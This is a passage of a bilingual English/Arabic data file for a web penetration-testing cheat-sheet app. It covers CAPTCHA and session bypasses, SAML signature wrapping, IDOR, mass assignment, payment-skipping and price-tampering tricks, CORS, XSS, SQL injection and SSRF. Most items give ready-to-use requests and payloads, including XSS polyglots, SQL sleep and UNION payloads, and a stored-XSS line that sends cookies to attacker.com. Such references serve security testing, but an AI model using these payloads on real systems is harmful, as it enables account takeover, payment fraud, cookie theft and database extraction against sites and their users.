            en: "Pre-Validation Bypass: If validation happens linearly, send incorrect credentials with correct captcha, then automate the rest.",
            ar: "التحقق غير المتزامن: إذا كانت الكابتشا يتم التحقق منها بشكل منفصل، قد تتمكن من إرسال طلبات سريعة قبل تحديث حالة الكابتشا.",
            exploit: {
              en: 'Enter invalid credentials but solve the CAPTCHA properly. The app validates the CAPTCHA and grants you a "verified" session state. Now, immediately blast login attempts; the back-end might remember your session as "captcha-passed" temporarily.',
              ar: 'حل الكابتشا بيديك، وأدخل باسورد خاطئ. الآن تذكرك خوادمهم كـ "شخص حقيقي اجتاز الكابتشا". قم بسرعة بتنفيذ بروت-فورس عالي السرعة قبل أن ينتهي الأثر الداخلي لذلك التوكن.',
            },
            code: [
              "1. Solve CAPTCHA via UI, backend sets Cookie: captcha_passed=true",
              "2. Brute-force via script using the elevated Cookie without sending tokens.",
            ],
          },
        ],
      },
      {
        title: {
          en: "11. Session Management & Race Conditions",
          ar: "11. إدارة الجلسات وحالات الاستباق (Race Conditions)",
        },
        items: [
          {
            en: "Login Race Condition: Send 20-30 concurrent login requests for the same user. May result in multiple active sessions and bypass concurrency limits.",
            ar: "الاستباق في تسجيل الدخول (Race Condition): إرسال 20-30 طلب تسجيل دخول متزامن لنفس المستخدم. قد يكسر قيود تزامن الجلسات المتعددة.",
            exploit: {
              en: 'If an app enforces a "One device at a time" rule, send 30 login requests in identical parallel threads using tools like Turbo Intruder. The server checks the state 30 times simultaneously before the first one sets the "logged-in" flag.',
              ar: 'لإسقاط سياسة "جهاز واحد فقط"، أرسل 10 طلبات تسجيل دخول بتزامن دقيق جداً باستخدام `Turbo Intruder`. المحرك سيفحص الأسطر بنفس الجزء من الثانية ויمنحك 10 جلسات.',
            },
            code: [
              'POST /login HTTP/1.1\n\n{"username": "admin", "password": "123"} // Sent 30 times concurrently',
            ],
          },
          {
            en: "Session Termination Failure: Log out of the application, then immediately try to use the old session cookie in an authenticated endpoint.",
            ar: "فشل إنهاء الجلسة: قم بتسجيل الخروج، ثم استخدم كوكي الجلسة القديم مباشرة للقيام بعمل حساس للتحقق من أن الخادم لم يبطل الجلسة.",
            exploit: {
              en: "Capture your `session_id` cookie. Click Logout. Resend a request referencing the old `session_id`. If it works, the server just deleted the cookie from your browser but didn't delete the session from its database.",
              ar: "انسخ كود الجلسة (Session ID)، ثم اضغط تسجيل الخروج. حاول استخدام الكود المنسوخ لإرسال طلب. إن نجح، فهذا يعني أن الموقع مسح الكود من متصفحك ولكنه لم يُلغه من سيرفراته أبداً.",
            },
            code: [
              "GET /api/profile HTTP/1.1\nCookie: session=OLD_LOGGED_OUT_SESSION",
            ],
          },
          {
            en: "Session Fixation: Authenticate using a session token (e.g. PHPSESSID) issued BEFORE login. If it not rotated, it is vulnerable.",
            ar: "تثبيت الجلسة (Session Fixation): اجبر الضحية على استخدام رمز جلسة حددته أنت مسبقاً، وبعد تسجيل الضحية الدخول، سيكون حسابهم متاحاً لدخولك.",
            exploit: {
              en: "Browse the site unauthenticated to get a guest `PHPSESSID`. Send the victim a link setting their cookie to this ID (via XSS or URL parameter `?PHPSESSID=123`). Once they log in, their account is bound to your token.",
              ar: "احصل على رمز جلسة (زائر). اجعل الضحية يزور الموقع بنفس الرمز (عبر تحايل في الرابط أو XSS). عندما يُسجل هو الدخول، ستترقى صلاحية الرمز الذي بحوزتك لتُصبح جلسة الضحية المُسجلة!",
            },
            code: ["http://target.com/login?PHPSESSID=ATTACKER_SESSION_ID"],
          },
        ],
      },
      {
        title: {
          en: "12. SAML & Enterprise Flow Flaws",
          ar: "12. ثغرات SAML وتسجيل الدخول المؤسسي",
        },
        items: [
          {
            en: "XML Signature Wrapping (XSW): Manipulate the XML structure of the SAML response so the signature validates a benign node while the backend processes a malicious <NameID> (e.g., admin).",
            ar: "تغليف التوقيع في XML (XSW): التلاعب بهيكلة XML لرد SAML بحيث يتم التحقق من عقدة وهمية بينما يقبل الخادم اسم المستخدم (NameID) الخبيث.",
            exploit: {
              en: "Intercept the SAML assertion. Clone the main assertion that contains the signature. Place the original (benign) assertion somewhere else in the document, and alter the `<NameID>` of the first assertion to `admin`. The parser verifies the moved signature but uses the first `<NameID>`.",
              ar: "السامل هو مجرد ملف `XML`. قم بنسخ الجزء الموقع إلكترونياً وضعه في ذيل الملف كعنصر مهمل (ليراه الجدار الناري ويعتبره سليماً). ثم في بداية الملف ضع جزءاً خبيثاً يحمل اسم المستخدم `admin`. المحلل الضعيف سيقرأ الجزء الأول المزور.",
            },
            code: [
              "<Assertion><Subject><NameID>admin</NameID></Subject></Assertion>\n<!-- Signature checks the secondary original node below -->\n<Assertion><Subject><NameID>user</NameID></Subject><Signature>...</Signature></Assertion>",
            ],
          },
          {
            en: "Certificate Faking: Strip the signature entirely, or sign the modified SAML assertion with your own self-signed certificate.",
            ar: "تزوير الشهادات: إزالة التوقيع تماماً من الطلب، أو توقيع البيانات بـ Certificate قمت بإنشائه أنت.",
            exploit: {
              en: "In Burp suite, use the SAML Raider plugin. Intercept the SAML response, change your user to the target (admin), completely strip the XML signature, and forward it. If it works, the backend accepts unsigned asserts.",
              ar: "باستخدام إضافة (SAML Raider) في Burp، اعترض الحزمة. امسح جزء التوقيع تماماً أو وقعه أنت بشهادة وهمية خاصة بك. بعض الأنظمة تقبلها.",
            },
            code: [
              "<!-- Intercepted SAML response, <Signature> tags completely removed -->",
            ],
          },
          {
            en: "Comment Injection: If checking format admin@admin.com, use admin<!--comment-->@admin.com to bypass filters and coerce the backend parser.",
            ar: "حقن التعليقات في XML: إدراج تعليقات داخل الإيميل في رسالة SAML للتحايل على فحص الصيغة البرمجية.",
            exploit: {
              en: "Some Identity Providers (IdP) check email domains. Using `admin<!--x-->@target.com` bypasses the regex check `/.+@target\\.com/`, but the actual XML parser might strip the comment, extracting `admin@target.com` as the final logged-in identity.",
              ar: "لحقن الإيميل المعتمد، استخدم الرموز `<!-- -->` الخاصة بملفات الـ XML لفصل النص. جدار الحماية سيراه شيخاً غريباً ويتجاهله، بينما الخادم الداخلي سيمسح التعليق ويدمج النص المُتبقي ليصبح الإيميل الرسمي للضحية.",
            },
            code: [
              '<NameID Format="...:emailAddress">admin<!--bypass-->@target.com</NameID>',
            ],
          },
        ],
      },
    ],
  },
  {
    id: "access-control",
    title: {
      en: "Access Control, IDOR & Business Logic",
      ar: "التحكم بالوصول، ثغرات IDOR، ومنطق العمل",
    },
    iconName: "Shield",
    description: {
      en: "Techniques for finding Privilege Escalation, Insecure Direct Object References (IDOR), and Business Logic flaws.",
      ar: "تقنيات لاكتشاف ثغرات تصعيد الصلاحيات، الإشارات غير الآمنة للكائنات (IDOR)، وأخطاء منطق العمل.",
    },
    steps: [
      {
        title: {
          en: "1. Insecure Direct Object Reference (IDOR)",
          ar: "1. ثغرات IDOR (تخطي الصلاحيات عبر المعرفات)",
        },
        items: [
          {
            en: "Direct ID Modification: Change sequential or predictable IDs in URLs, form bodies, or JSON payloads (e.g., GET /api/user/101 -> GET /api/user/102).",
            ar: "التعديل المباشر للمعُرف (ID): تغيير الأرقام التسلسلية أو المتوقعة في الروابط، أو محتوى الطلب (مثل تغيير 101 إلى 102).",
            exploit: {
              en: "Capture the request when viewing your own resource. Change the value of `id`, `user_id`, or `account` to another user's number to see if their data is returned.",
              ar: "راقب الطلب المتعلق بعرض فواتيرك أو بياناتك، ستجد معلمات تحدد هويتك (مثل `id=15`). قم بتغييره إلى (16) ولاحظ ما إذا أظهر لك سيرفر الموقع بيانات مستخدم آخر.",
            },
            code: [
              "GET /profile/invoices?id=102 HTTP/1.1\nCookie: session=<your_session_token>",
            ],
          },
          {
            en: 'Array Wrapping Bypass: If {"id": 102} is blocked, try wrapping it in an array: {"id": [102]}. This often confuses basic type-checking filters.',
            ar: 'تخطي الفلاتر بالمصفوفات (Arrays): إذا قمت بطلب {"id": 102} وتم حظرك، جرب وضع المعرف في مصفوفة {"id": [102]} لخداع أداة الفلترة.',
            exploit: {
              en: "Some authorization filters expect an integer. If you send an array `[102]`, the filter might break or return true, but the database parser will dynamically map the array to the query.",
              ar: "بعض الفلاتر البرمجية تنكسر إذا مررت لها مصفوفة (Array) بدلاً من رقم، بينما تتأقلم قاعدة البيانات مع المصفوفة وتقوم بتنفيذ العملية على الضحية.",
            },
            code: ['POST /api/v1/delete_post HTTP/1.1\n\n{"post_id": [1005]}'],
          },
          {
            en: "HTTP Parameter Pollution (HPP): Supply multiple ID values to override access checks: ?id=101&id=102. The backend might authorize 101 but fetch 102.",
            ar: "تلوث المعلمات (HPP): تزويد الخادم بأكثر من مُعرف في نفس الطلب مثل ?id=my_id&id=victim_id. قد يفحص الكود المُعرف الأول بينما تنفذ قاعدة البيانات المُعرف الثاني.",
            exploit: {
              en: "Inject two identical parameters. The security middleware might check `id=1` (yours) and allow the request, but the database might process `id=2` (the victim's).",
              ar: "حيلة تمرير معلمتين بنفس الاسم. الفلتر قد يقرأ المُعرف الأول الخاص بك ويسمح لك بالدخول، بينما الـ API يقرأ المُعرف الأخير الخاص بالضحية.",
            },
            code: ["GET /api/v1/messages?id=my_id&id=victim_id HTTP/1.1"],
          },
          {
            en: 'JSON Parameter Pollution: Send duplicate keys in JSON payloads: {"id": 101, "id": 102}.',
            ar: 'تلوث JSON: إرسال مفاتيح مكررة في محتوى JSON: {"id": 101, "id": 102}.',
            exploit: {
              en: "Similar to HPP in URLs, supply overlapping keys in a JSON body. Most JSON parsers will overwrite the first key with the value of the second key.",
              ar: "تُشبه الطريقة السابقة لكن في حزم الـ JSON. غالبيات المكتبات البرمجية إذا شاهدت مفتاحين متطابقين، تعتمد المفتاح الأخير فقط.",
            },
            code: ['{"user_id": 99, "user_id": 1}'],
          },
          {
            en: "Wildcard Injection: Replace the ID string with a wildcard (*) to fetch all records (e.g., /api/users/*).",
            ar: "حقن العلامات البرية (Wildcards): استبدل المُعرف بعلامة النجمة (*) لمحاولة استدعاء جميع السجلات.",
            exploit: {
              en: "If the identifier isn't parameterized properly in the backend query, injecting a `*` or `%` symbol might dump the entire table records without needing a specific ID.",
              ar: "إذا كان الـ API يطلب ملفات أو قواعد بيانات ولم يكن هناك حماية كافية، فإن حقن نجمة (*) قد يجعل الاستعلام يُرجع جميع النتائج دفعة واحدة.",
            },
            code: [
              "GET /api/v1/invoices/* HTTP/1.1\nCookie: session=<your_session_token>",
            ],
          },
          {
            en: "UUID/GUID Leakage: If IDs are unguessable UUIDs, look for other endpoints (like search, public profiles, comments) that leak the victim's UUID.",
            ar: "تسريب معرفات UUID: إذا كانت المعرفات عبارة عن سلسلة غير متوقعة (UUID)، ابحث في مسارات أخرى (كالبحث أو التعليقات) عن مكان يسرب مُعرف الضحية.",
            exploit: {
              en: 'A UUID like `123e4567-e89b-12d3...` is impossible to guess. Search all API history in Burp to see if features like "Search Users", "Add Friend", or "Comment Replies" accidentally leak the UUIDs of other users.',
              ar: "لا يمكن تخمين الـ UUID بالكمبيوتر العادي أبداً. يجب أن تخترق النظام عن طريق تسريب هذه المعرفات من أدوات الـ Search أو التعليقات في التطبيق ذاته ثم استخدامها في ثغرات BOLA.",
            },
            code: [
              'GET /api/v1/search?query=victim HTTP/1.1\n\nHTTP/1.1 200 OK\n[{"username": "victim", "uuid": "123e4567-e89b-12d3-a456-426614174000"}]',
            ],
          },
          {
            en: "Path Traversal/Extension Bypass: Add an extension to bypass endpoint rules: /api/users/102.json or /api/users/102.xml.",
            ar: "تخطي الامتدادات: أضف مسارات أو امتدادات للملف مثل /api/users/102.json لتخطي قواعد الجدار الناري (WAF) أو الموجه (Router).",
            exploit: {
              en: "WAFs and routers might block `/api/users/102`. Appending a standard format like `.json` can bypass the block if the routing regex only matches the ID strictly via `\\d+`.",
              ar: "بعض الموجهات أو الجدران النارية قد تحظر الوصول لمسار الضحية. عند إضافة مسار أو امتداد كالـ `.json` في النهاية، قد تخدع فلتر البلوك بينما يقرأ الخادم الداخلي الـ ID.",
            },
            code: ["GET /api/v1/users/admin.json HTTP/1.1"],
          },
        ],
      },
      {
        title: {
          en: "2. Privilege Escalation (Vertical)",
          ar: "2. تصعيد الصلاحيات العامودي (Vertical Escalation)",
        },
        items: [
          {
            en: 'Mass Assignment: Guess and inject administrative parameters during registration or profile updates (e.g., "isAdmin": true, "role": 1, "is_superuser": true).',
            ar: 'التعيين الشامل (Mass Assignment): تخمين وإضافة معلمات إدارية مخفية أثناء التسجيل أو تحديث الملف الشخصي مثل "isAdmin": true أو "role": "admin".',
            exploit: {
              en: "Capture the POST request for updating your profile. Inject hidden backend properties like `role_id` or `group`. If the backend doesn't filter allowed keys, you might become an admin.",
              ar: "اعترض طلب تحديث بياناتك (POST/PUT). قم بالتخمين وإضافة خصائص مثل `role` ضمن محتوى ה־JSON. إذا لم يكن الخادم يحمي الكيانات المخفية، سيرتفع مستوى حسابك.",
            },
            code: [
              '{"username": "test", "email": "test@test.com", "role": "admin", "role_id": 1}',
            ],
          },
          {
            en: "HTTP Method Manipulation: If GET /admin/users is forbidden, try POST, PUT, PATCH, DELETE, or even arbitrary methods like INVENT /admin/users.",
            ar: "التلاعب بطرق HTTP: إذا كان الوصول للمسار الإداري بـ GET ممنوعاً، جرب استخدام POST، PUT، PATCH، DELETE، أو حتى طرق غير مدرجة لتجاوز قواعد الجدار الناري.",
            exploit: {
              en: "A security rule might strictly say `Block GET /admin`. By changing the method in Burp Suite to `POST /admin`, the rule might fail to trigger, allowing you in.",
              ar: "قد تكون قاعدة جدار الحماية تنص على (حظر طلب GET لمسار /admin). قم بتغييره إلى POST لكسر هذا الشرط والوصول للبيانات بسلام.",
            },
            code: ["POST /admin/users HTTP/1.1\nContent-Length: 0"],
          },
          {
            en: "Force Browsing: Access administrative endpoints (e.g., /admin, /dashboard, /v1/admin/debug) without being authenticated as an admin.",
            ar: "التصفح الإجباري (Force Browsing): محاولة الوصول المباشر لمسارات اللوحات الإدارية المخفية بدون امتلاك صلاحيات.",
            exploit: {
              en: "Simply try appending common administrative paths into your browser while logged in as a normal user. Broken Access Control might let you view the page.",
              ar: "اكتب المسارات الإدارية يدوياً في المتصفح أو استخدم دير-سيرش. إذا كان المبرمج يعتمد على إخفاء الزر فقط وليس التحقق من الجلسة، ستتمكن من الدخول.",
            },
            code: [
              "https://target.com/admin/settings",
              "https://api.target.com/v1/system/debug",
            ],
          },
          {
            en: "Header Manipulation: Bypass proxies/WAFs using headers like X-Original-URL: /admin, X-Rewrite-URL: /admin, or X-Custom-IP-Authorization: 127.0.0.1.",
            ar: "تخطي حماية الوكلاء (Proxies): أضف هيدرات توهم الخادم بمسار مختلف، مثل X-Original-URL: /admin للوصول لصفحة الإدارة سرا.",
            exploit: {
              en: "Request a normal allowed page (like `/home`), but inject headers telling the reverse proxy to rewrite the request to the blocked `/admin` page secretly.",
              ar: "أرسل الطلب الخارجي لصفحة مسموحة كـ `/home` لتخطي الرقابة، واضف هيدر يُخبر الوكيل الداخلي أن يوجهك لـ `/admin`.",
            },
            code: [
              "GET /home HTTP/1.1\nX-Original-URL: /admin\nX-Rewrite-URL: /admin\nX-Forwarded-For: 127.0.0.1",
            ],
          },
        ],
        payloads: [
          '{"email": "test@test.com", "isAdmin": true}',
          '{"role": "admin"}',
          "X-Original-URL: /admin",
          "X-Rewrite-URL: /admin",
        ],
      },
      {
        title: {
          en: "3. Multi-Step Business Logic Flaws",
          ar: "3. ثغرات مسارات منطق العمل (Business Logic)",
        },
        items: [
          {
            en: "Flow Bypassing: Skip mandatory steps in a process. E.g., add items to cart, jump directly to /order/confirm, skipping /checkout/pay.",
            ar: "تخطي مسارات العمل (Flow Bypassing): تخطي خطوات أساسية، مثل إضافة منتج للسلة ثم القفز مباشرة لرابط /order/confirm والهروب من صفحة الدفع وتأكيد الشراء.",
            exploit: {
              en: "Identify a multi-step process (like checkout or password reset). Intercept the requests and try jumping to the final step endpoint without submitting the intermediary verifications.",
              ar: 'راقب عملية تتطلب عدة خطوات (كعملية الدفع). بدل أن ترسل طلب الدفع، أرسل فوراً طلب "تأكيد واستلام الطلب" الذي يسبقه. إذا نجح، ستتخطى عملية الدفع بالكامل.',
            },
            code: [
              'POST /cart/add HTTP/1.1\n\n{"item_id": 1}',
              "--> SKIP /checkout/payment <--",
              'POST /checkout/confirm HTTP/1.1\n\n{"cart_id": 99}',
            ],
          },
          {
            en: "Price & Quantity Manipulation: Change the price parameter to a negative value or zero. Change quantity to a fraction or a massive integer to cause integer overflow.",
            ar: "التلاعب بالأسعار والكمية: تعديل سعر المنتج إلى قيمة سالبة أو صفر. أو تغيير الكمية لرقم ضخم لإحداث خطأ في الحساب (Integer Overflow).",
            exploit: {
              en: "When checking out, modify parameters sent in the POST request. Change `price=1000` to `price=0.01` or `price=-500` (which might subtract from your total). Change `quantity` to massive numbers like `2147483648` to overflow the calculation.",
              ar: "اعترض الطلب أثناء طلب منتجك. جرب تغيير المعلمة الخاصة بالسعر (price) إلى (0) أو إلى رقم سالب لينقص من الفاتورة. وجرب تغيير الكمية إلى أرقام عشرية كـ (0.5) أو أرقام فلكية لإحداث خطأ برمجي (Overflow).",
            },
            code: [
              'POST /api/v1/checkout HTTP/1.1\n\n{"item_id": 55, "price": 0.01, "qty": -5}',
            ],
          },
          {
            en: "Currency Mismatch: Pay in a cheaper currency if the backend only checks the numeric amount but processes the purchase in the native currency.",
            ar: "التلاعب بالعملات: الدفع بعملة رخيصة إذا كان نظام الدفع يفحص الرقم المدفوع فقط دون التأكد من تطابق نوع العملة.",
            exploit: {
              en: "Change currency parameter from `USD` or `EUR` to a much cheaper currency when reaching the payment gateway. The backend might only verify if the number 100 was paid without matching the currency ID.",
              ar: "في بعض المواقع يكون هناك ثغرة في التحقق من المطابقة في العملة، جرب تسديد المبلغ بعملتك المحلية وبنفس الرقم المدفوع بدون التحويل لعملة الموقع.",
            },
            code: [
              'POST /api/payment HTTP/1.1\n\n{"amount": 100, "currency": "INR"}',
            ],
          },
          {
            en: "Discount/Coupon Abuse: Apply the same single-use coupon code simultaneously in 10 different browser tabs (Race Condition).",
            ar: "استغلال الكوبونات: تطبيق خصم الكوبون بالتزامن وخلال نفس اللحظة (Race Condition) في عدة ملفات لتفعيل الخصم بشكل مضاعف.",
            exploit: {
              en: "Send 20 apply-coupon requests at the exact same millisecond using Burp Suite Turbo Intruder/Race Condition tools. A logic flaw might apply the 20% discount 20 times before invalidating the code.",
              ar: "قم بإرسال طلب تطبيق الكوبون 20 مرة في نفس الجزء من الثانية (اقرأ موضوع Race Condition). الداتا بيس قد تقبله وتعطيك خصم 100% لأنها لم يسعها الوقت لشطبه.",
            },
            code: [
              'POST /api/v1/coupon/apply HTTP/1.1\n\n{"code": "WELCOME20"}',
            ],
          },
        ],
      },
      {
        title: {
          en: "4. CORS (Cross-Origin Resource Sharing) Flaws",
          ar: "4. ثغرات أخطاء مشاركة الموارد (CORS)",
        },
        items: [
          {
            en: "Origin Reflection: Send Origin: https://evil.com. If the server replies with Access-Control-Allow-Origin: https://evil.com and Access-Control-Allow-Credentials: true, it's vulnerable.",
            ar: "انعكاس الـ Origin: أرسل هيدر Origin: https://evil.com. إذا استجاب السيرفر وقبله وأعطى صلاحية Credentials، فالموقع مصاب ويُمكن سرقة بياناته.",
            exploit: {
              en: "Intercept an authenticated request in Burp. Add `Origin: https://arbitrary-domain.com`. If the server reflects it back in `Access-Control-Allow-Origin` and enables `Credentials`, you can host a JS file on your server to read their data.",
              ar: "اعترض الطلب وأضف هيدر `Origin` إلى نطاقك. إذا استجاب السيرفر وعكس النطاق متبوعاً بصلاحية `Credentials: true`، فيمكنك بناء صفحة خبيثة تسرق بيانات الضحايا عند النقر عليها.",
            },
            code: [
              "GET /api/userinfo HTTP/1.1\nOrigin: https://attacker.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true",
            ],
          },
          {
            en: 'Null Origin Bypass: Send Origin: null. Sometimes developers whitelist the "null" string mistakenly for local testing.',
            ar: "تخطي الـ Null Origin: إرسال Origin: null. بعض المبرمجين يقومون بالسماح للـ null من أجل ملفات الـ local.",
            exploit: {
              en: 'Send `Origin: null`. If accepted, use an iframe with a `sandbox` attribute (`sandbox="allow-scripts allow-top-navigation allow-forms"`) that forces the Origin of your exploit request to be `null`.',
              ar: "أرسل الطلب بهيدر `Origin: null`. إذا نجح، صمم ثغرتك داخل `iframe` يحمل خاصية `sandbox`، لأنها تُجبر المتصفح على جعل مصدر الطلب `null`.",
            },
            code: [
              '<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>...</script>">',
            ],
          },
          {
            en: "Subdomain / Prefix Flaws: If targeting example.com, try sending Origin: https://attacker.example.com or Origin: https://example.com.attacker.com to bypass weak regex matches.",
            ar: "أخطاء الريجكس (Regex Flaws): إذا كان الموقع example.com، جرب إرسال Origin: https://example.com.evil.com لتجاوز مطابقة الفلتر الضعيف.",
            exploit: {
              en: "Subdomains and prefixes could be whitelisted via a weak Regex. Test combinations like `TargetDomain.com.AttackerDomain.com` or `AttackerTargetDomain.com` to bypass.",
              ar: "بعض المبرمجين يتحققون مما إذا كان اسم موقعهم موجوداً ضمن الـ Origin بدون التدقيق فيه حصراً. جرب أطراف النطاقات واسماء مشابهة.",
            },
            code: [
              "Origin: https://example.com.attacker.com\nOrigin: https://attacker.example.com",
            ],
          },
        ],
        payloads: [
          "Origin: https://evil.com",
          "Origin: null",
          "Origin: https://target.com.evil.com",
        ],
      },
    ],
  },
  {
    id: "injection",
    title: {
      en: "Input Validation & Injection",
      ar: "التحقق من المدخلات وهجمات الحقن",
    },
    iconName: "Terminal",
    description: {
      en: "Testing methodology for injections like XSS, SQLi, SSRF, LFI, and OS Command Injection.",
      ar: "منهجية الفحص لثغرات الحقن مثل XSS و SQLi و SSRF وإدراج الملفات وحقن أوامر النظام.",
    },
    steps: [
      {
        title: {
          en: "1. Cross-Site Scripting (XSS)",
          ar: "1. ثغرات حقن السكربتات (XSS)",
        },
        items: [
          {
            en: "Reflected XSS: Inject payloads in URL parameters, search fields, and error messages. Look for unescaped reflections in the response source code.",
            ar: "XSS الانعكاسي (Reflected): حقن البايلودات في روابط URL ومربعات البحث ورسائل الخطأ. تحقق من انعكاس البايلود في الكود المصدري دون فلترة (Unescaped).",
            exploit: {
              en: 'Identify a parameter that reflects into the DOM (e.g., `?q=`). Break out of the current HTML tag context (e.g., using `">`) and insert an alert payload.',
              ar: 'ابحث عن مُدخل ينعكس في الصفحة (مثل `?q=`). قم بكسر وسوم لغة الـ HTML الحالية (مثال: استخدام `">`) ثم قم بإدراج كود خبيث لتنفيذه في متصفح الضحية.',
            },
            code: ['"><script>alert(document.cookie)</script>'],
          },
          {
            en: "Stored XSS: Test profile information, bio fields, comment sections, and file uploads (e.g., uploading an SVG containing a script payload).",
            ar: "XSS المخزن (Stored): اختبار حقول الملف الشخصي، التعليقات، والأسماء، ورفع الملفات (مثل رفع ملف SVG يحتوي على أوامر جافا سكربت).",
            exploit: {
              en: "Find inputs that save data permanently to the database. Submit the payload, then visit the page where this data is rendered to see if the script executes.",
              ar: "ابحث عن المُدخلات التي تُحفظ دائمًا في قاعدة البيانات، ثم قم بكتابة حمولة XSS. قم بزيارة الصفحة التي تعرض هذا المُدخل (كصفحة الملف الشخصي) للتحقق مما إذا كان الكود سيُنفذ.",
            },
            code: [
              'POST /profile/update HTTP/1.1\n\n{"bio": "<script>fetch(\'https://attacker.com/?c=\'+document.cookie)</script>"}',
            ],
          },
          {
            en: "DOM XSS: Analyze client-side JavaScript for unsafe sinks (e.g., innerHTML, eval). Inject via URL fragments (#) or postMessage.",
            ar: "XSS في DOM: تحليل أكواد JavaScript للبحث عن دوال غير آمنة (مثل innerHTML). الحقن عبر جزء الـ URL (#) المُسمى Fragment.",
            exploit: {
              en: "Search for `location.hash` or `location.search` being passed to `document.write()` or `innerHTML`. Inject the payload directly in the browser fragment.",
              ar: "ابحث عن استخدام دوال غير آمنة مثل `innerHTML` لطباعة قيم مأخوذة من الـ URL كـ `location.hash`. لا يذهب الهاش (ما بعد علامة #) للخادم بل يُنفذ في المتصفح حصراً.",
            },
            code: ["https://target.com/page.html#<img src=x onerror=alert(1)>"],
          },
          {
            en: "Filter Bypasses: Use varying cases `<sVg>`, alternate attributes `onload/onerror`, and polyglots to bypass Web Application Firewalls (WAF).",
            ar: "تخطي الفلاتر وجدران الحماية (WAF Bypass): تغيير حالة الحروف مثل `<sVg>`، استخدام سمات بديلة `onload` أو `onerror`، واستخدام بايلودات الـ Polyglots.",
            exploit: {
              en: "If the WAF blocks `<script>`, try `<svg>`, `<img onerror>`, or `javascript:` pseudoprotocols. Change casing if the regex is case-sensitive.",
              ar: "إذا منعك جدار الحماية من إدخال `<script>`، حاول استدعاء الجافا سكربت بمصادر بديلة كالأحداث (Events) مثل `onload` في `<body>` أو `onerror` في `<img>`.",
            },
            code: [
              "<svg/onload=prompt(1)>",
              "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            ],
          },
        ],
        payloads: [
          '"><script>alert(1)</script>',
          "<svg onload=alert(1)>",
          "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        ],
      },
      {
        title: {
          en: "2. SQL Injection (SQLi)",
          ar: "2. حقن قواعد البيانات (SQLi)",
        },
        items: [
          {
            en: "Error-Based: Append ', \", \\, or /* to inputs and observe if the application throws database syntax errors.",
            ar: "الحقن المعتمد على الأخطاء (Error-Based): إضافة علامات ', \", \\, أو /* وملاحظة إذا كان الخادم يُرجع أخطاء تخص قواعد البيانات.",
            exploit: {
              en: "Add a single quote to the parameter (e.g., `?id=1'`). If the page shows a MySQL or syntax error, the field is vulnerable.",
              ar: "أضف علامة اقتباس إلى المُدخل. إذا أظهر الموقع رسالة خطأ برمجية تخص قاعدة البيانات (مثل Syntax Error)، فالمُدخل مصاب.",
            },
            code: ["?id=1'\n?search=laptop\"\\"],
          },
          {
            en: "Union-Based: Determine column count using ORDER BY, then extract data using UNION SELECT.",
            ar: "الحقن بالدمج (Union-Based): تحديد عدد الأعمدة باستخدام ORDER BY ثم استخراج البيانات باستخدام UNION SELECT.",
            exploit: {
              en: "Use `ORDER BY 1`, `ORDER BY 2` until you hit an error to count columns. Then use `UNION SELECT` to dump data from other tables.",
              ar: "استخدم `ORDER BY` وقم بزيادة الرقم حتى تتغير الصفحة أو يظهر خطأ لمعرفة عدد الأعمدة، ثم استخدم `UNION SELECT` لاستخراج جداول أخرى.",
            },
            code: [
              "1' ORDER BY 3--",
              "-1' UNION SELECT 1, database(), version()--",
            ],
          },
          {
            en: "Blind / Time-Based: Inject sleep commands (WAITFOR DELAY, SLEEP(), pg_sleep()) and observe response time delays.",
            ar: "الحقن الأعمى والزمني (Blind / Time-Based): حقن أوامر تأخير زمني مثل SLEEP() وملاحظة تأخر استجابة السيرفر للاستدلال على وجود الثغرة.",
            exploit: {
              en: "If the server responses are identical regardless of input, inject a time delay function. If the response takes 5 seconds longer, the injection works.",
              ar: "إذا كان السيرفر لا يُظهر أخطاء، قم بعكس النتيجة باستخدام أمر `SLEEP()`. تأخر الخادم في الرد يثبت نجاح الاستغلال الزمني.",
            },
            code: [
              "1'; WAITFOR DELAY '0:0:5'--",
              "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
          },
          {
            en: "Second-Order SQLi: Inject payload into a safe storage context (like profile name), which later gets executed insecurely in an admin panel or invoice generation.",
            ar: "الحقن من الدرجة الثانية (Second-Order SQLi): حقن البايلود في مكان يتم تخزينه بأمان (كالاسم)، ليتم تنفيذه لاحقاً بشكل غير آمن في لوحة التحكم أو ملفات PDF.",
            exploit: {
              en: "Save your profile name as `' OR 1=1--`. The backend saves it safely, but when an admin searches or generates a PDF, the query concatenates your name insecurely and executes the exploit.",
              ar: "ضع حمولة الحقن في حقل يتم حفظه كاسمك. عندما يفتح الإداري لوحة التحكم أو عند طباعة فاتورة، يتم استدعاء اسمك بدون فلترة فتُنفذ أوامر قاعدة البيانات.",
            },
            code: [
              "POST /profile/update HTTP/1.1\n\n{\"name\": \"admin' OR '1'='1'--\"}",
            ],
          },
        ],
        payloads: [
          "' OR 1=1--",
          "'; WAITFOR DELAY '0:0:5'--",
          "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
          "1' ORDER BY 1,2,3--",
        ],
      },
      {
        title: {
          en: "3. Server-Side Request Forgery (SSRF)",
          ar: "3. تزوير طلبات الخادم (SSRF)",
        },
        items: [
          {
            en: "Internal IP Probe: Test parameters accepting URLs to fetch http://127.0.0.1 or http://localhost to access internal admin panels.",
            ar: "فحص الشبكات الداخلية: اختبار المعلمات التي تقبل الروابط (URLs) لطلب الوصول لـ http://127.0.0.1 لفتح اللوحات الداخلية.",
            exploit: {
              en: "Replace a URL parameter (like `?url=image.png`) with `http://localhost/admin` to make the server fetch its own internal dashboard.",
              ar: "استبدل رابط الصورة الممرر في معلمات المسار (مثل `?url=`) برابط داخلي كـ `http://localhost/admin` لإجبار السيرفر على فتح اللوحة الخاصة به للإدارة.",
            },
            code: [
              'POST /api/v1/webhook HTTP/1.1\n\n{"url": "http://127.0.0.1:80/admin"}',
            ],
          },
          {
            en: "Bypass Filters: Use decimal representations (2130706433), octal, enclosed alphanumerics, or IPv6 (::1) to bypass host validation.",
